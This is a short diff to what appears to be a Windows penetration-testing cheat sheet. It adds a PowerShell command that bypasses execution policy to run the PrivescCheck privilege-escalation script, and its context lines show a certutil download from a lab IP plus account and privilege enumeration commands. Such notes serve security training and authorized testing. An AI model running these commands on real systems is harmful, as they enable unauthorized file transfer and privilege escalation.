@@ -6,6 +6,7 @@ Download a file
 certutil -urlcache -f http://10.10.10.1/<file> <binary_name>
 ```
 
+`: powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
 ### System information
 `whoami /priv`
 `net users`
